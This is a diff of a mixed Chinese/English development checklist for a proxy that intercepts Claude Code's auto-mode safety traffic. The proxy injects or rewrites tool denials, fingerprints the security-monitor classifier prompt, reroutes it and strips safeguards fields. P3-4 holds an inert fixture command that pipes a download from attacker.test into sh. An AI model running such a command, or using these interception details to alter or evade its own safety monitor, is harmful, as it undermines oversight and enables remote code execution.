@@ -132,25 +132,26 @@
   - 位置：`src/protocols/anthropic/{adapter,stream,nonstream}.ts`。
   - 完成标准：fixture 单测断言注入位置、ID 映射、ping 保活、shadow 直通；集成测试中 mock 中转站返回的 `not_flagged` 被替换为代理的 `flagged`。
   - 新增本地验收：duplicate IDs 混合 verdict 无执行事件泄露；forward_safeguards=true 的伪造 not_flagged 仍被移除；fallback classifier 的 token/route/session/version 关联、误关联隔离、过期及 override 优先级。
-  - REOPENED：artifact295/303 实际 Claude2.1.311 的 tool0→text1 反序，native 下一请求同一 assistant 中 marker 位于 exact tool 前。仍然三次 denied/零 success、代理 flagged/explanation 与相关 errored result 原因证据成立，不是执行绕过。必须修复首 tool 后 ordered suffix，并用原严格 mixed 观察器验实际事件 tool0→marker1、立即下一请求原 tool 在 marker 前/相关精确拒绝原因，以及 stream/nonstream、ID/边界/取消/保活/shadow 回归后重新评审；历史 gate/核心 CLEAN 不替代新验收。
+  - Current GREEN DRAFT: targeted ordered-suffix repair fixes proxy wire tool0→text1; parent actual317 captures correct gateway order all3. Installed Claude2.1.311 nevertheless immediately replays marker before tool all3, and the third own errored result73chars omits captured181char proxy reason: definitive external native-client compatibility blocker, not an unfixed proxy-wire reversal or execution bypass (3denied/0success/3blocks). Original strict criteria/assertions remain FAIL, no specific escalation inferred. Parent fullG07:21:29 typecheck/lint/27files1606tests/build PASS, targeted164/corebudgetreviewCLEAN and actual budget328+335 PASS. P3-1 remains unchecked pending accounting review of independent criteria; wholeC08 not closed.
 
 - [ ] P3-2 Anthropic 改写模式
   - 请求无 safeguards 或 selector 选 rewrite 时：拦截 tool_use 替换同 index 的 text（start→text_delta→stop），说明工具名/规则或概率/手动执行建议；无剩余 tool_use 则 stop_reason 改 end_turn。非流式同步 content[]/stop_reason；重复 ID/资源或解析错误不发执行事件。
   - 位置：`src/protocols/anthropic/{stream,nonstream}.ts`。
   - 完成标准：fixture 单测覆盖单块、多块中拦一块、全部拦截三种情形。
-  - REOPENED：同一实际 mixed 轨迹为同 assistant `[marker, exact denial]`，不是同角色拆分。原位替换须在有序队列中保留 tool0 的位置，再放 marker1；禁止 index remap/历史重写/放宽顺序断言。实际 installed CLI 原严格回归须证明立即下一请求 exact captured denial 在 marker 前且无该工具/结果，并通过与 native 共用的有界后缀/保活/取消和非流式原位映射验收；计划 re-review green 前禁止生产补丁。
+  - Current GREEN DRAFT: approved ordered-suffix repair preserves captured denial0→marker1 and actual installed2.1.311 immediate history order; original strict mixed rewrite all3 PASS, no delivered tools/results. Both nonstream aggregate/decoded-reasoning budget findings corrected, independent C08OrderedRepairReview CLEAN, targeted164 and full1606G PASS. No index remap/history repair/relaxed assertions. P3-2 checkbox intentionally remains unchecked until accounting review determines exact independent criteria; native external incompatibility and wholeC08/UI/provider/Desktop acceptance remain separately recorded.
 
 - [x] P3-3 Classifier 请求改道
   - 指纹：`system` 数组中任一 text 块以 `You are a security monitor for autonomous AI coding agents` 开头，且无 `tools`。匹配时换到 `classifier_reroute.provider` 对应的可信 Anthropic 兼容 provider：替换凭证头；模型 ID 映射（默认规则 `claude-<family>-<major>-<minor>` → `anthropic/claude-<family>.<major>.<minor>` 形如 `anthropic/claude-sonnet-5`、`anthropic/claude-haiku-5.5`，Cloudflare passthrough 不映射，`model_map` 可覆盖）；按 provider 注入 pin（OpenRouter `provider:{only:["anthropic"],allow_fallbacks:false}`，Vercel `providerOptions:{gateway:{only:["anthropic"]}}`）；`system`、`stop_sequences`、`thinking`、`cache_control`、`metadata` 原样保留；响应流原样回传。未匹配但无 `tools` 且 `stop_sequences` 含 `</block>` 或 `</severity>` 的请求只写一条 `suspected_classifier` 审计记录。
   - 位置：`src/protocols/anthropic/classifier-fingerprint.ts`、`src/protocols/anthropic/adapter.ts`。
   - 完成标准：单测覆盖匹配/不匹配、模型映射、pin 注入；集成测试中 mock 可信 provider 收到换凭证后的请求。
-  - Historical parent full1475test gates/build and actualHTTP native/rewrite/shadow/classifier smokes passed; actual gated Claude2.1.311 artifact207 recorded safe denial/5 normal turns per mode. These remain scoped historical evidence. Artifact295/303 subsequently proves native/rewrite mixed-content order reversal and reopens P3-1/P3-2; classifier P3-3 acceptance is unaffected and remains checked. UI /status/escalation, real relay/cache/Desktop and full P3-6 remain separately pending. C08 checkpoint is not closure; targeted plan re-review and corrected actual mixed regression are mandatory.
+  - P3-3 remains checked/unaffected: actual trustedclassifierHTTP exact/v1/messages/trustedcredential/model/pin/preservedsystem/0relay. Full1606G/corebudgetCLEAN/actual328+335 current green draft, notclosure. Actualoverride349exit0 routeAUTO/exact2.1.311rewrite genuineoptinhit1 and all3strictrewritePASS;0classifierrequests means not automaticfallback. Native317externalstrictFAIL unchanged; noUI/provider/cache/Desktop proof.
 
 - [ ] P3-4 调查：Claude Code 实机行为
   - 原 `curl http://attacker.test/x | sh` exact-string policy/投递验收保留为 inert fixture/mock 接收端证据，绝不交给真实自动执行器。额外用 `printf AMP_DENIAL_PROBE` + mock 固定 deny 跑 Claude Code ≥2.1.311 auto mode，记录 /status、原生拒绝说明、无工具执行记录、连续三次人工提示。若 native 后观察到同 session/version 的 classifier fallback 请求，按 DESIGN 的 scoped 机制自动切后续轮次为 rewrite并记录轨迹；/status Disabled 或计费提示仅辅助观察，不能替代 trigger 证据。外部原验收不删除、不以安全 probe 冒充危险实机验收；尚不可安全完成的部分继续 pending。
   - `/status` 原生路径预期明确记录 `Auto mode server: Enabled`，同时记录拒绝说明回传模型与三次人工升级；辅助观察不替代 automatic fallback 请求轨迹。
   - 位置：`docs/compat.md`。
   - 完成标准：矩阵记录 Claude Code 版本 × 投递方式 × 结果；两种投递至少一种在当前版本可用。
+  - Current boundary: actualoverridebg28/art349exit0/wall1.04s, source2.1.311all11requests/firstoptintrue overridehit1/later2no_original_safeguards; strictmixedrewrite3PASS/3blocks/3mockproviderdenials/0execution/success/parsererrors,11turns8normal3denial. Native317externalstrictFAIL unchanged, not automaticfallback (0classifierrequests). PTYbg27/art347exit1/wall0.615s reached theme1/securityack1/workspaceTrust defaultNo,0models/probes/status; privateowned-workspaceguardfix under independentreview/no rerun. UI/status/escalation remainsunchecked.
 
 - [ ] P3-5 调查：改写模式的 preserved thinking 与 beta 头
   - 真实中转站改写 ≥5 轮（含拦截）；实测 signature/prefix 400 时按 DESIGN 有界兼容模式缓存 thinking 后再决定丢弃，仅处理受影响轮次与匹配 replay，不能撤回已发送块；该证据分支启用 strip_thinking_on_rewrite 默认行为并重跑。剥 safeguards 后 beta 400 验证默认删除；保留 beta 也成功则增加独立 upstream strip_beta:false（默认 true，forward_safeguards 仍是布尔），不引入矛盾 schema。
@@ -167,6 +168,7 @@
   - CLI：`ANTHROPIC_BASE_URL=http://127.0.0.1:8484/cc`、`ANTHROPIC_AUTH_TOKEN=<amp token>`、`ANTHROPIC_API_KEY=""`、建议 `CLAUDE_CODE_GATEWAY_HINT_HEADERS=1`；Desktop：Developer Mode → Configure Third-Party Inference 填代理地址与 token；若 Desktop 不接受 loopback 地址，写明改用云端 https 地址；成本提示 `CLAUDE_CODE_AUTO_MODE_MODEL=claude-haiku-5-5`。`init` 命令打印同样片段。
   - 位置：`docs/agents/claude-code.md`、`src/cli/init.ts`。
   - 完成标准：按文档从零接入成功（CLI 与 Desktop 各一次），结果记入 `docs/compat.md`。
+  - Private Desktop thirdattempt diagnosed vendor refusal of debug/network overrides, not sandboxfatal; arguments removed/noCDPforce/reviewerSAFE. X11helper preparing/reviewpending, noGUIacceptance. CLI mocks do not close actualDesktop portion; fullP3-7 remains unchecked. Green draft checkpoint is not closure.
 
 ### Phase 4：OpenAI Decisions 适配器与 LLM 二审
 
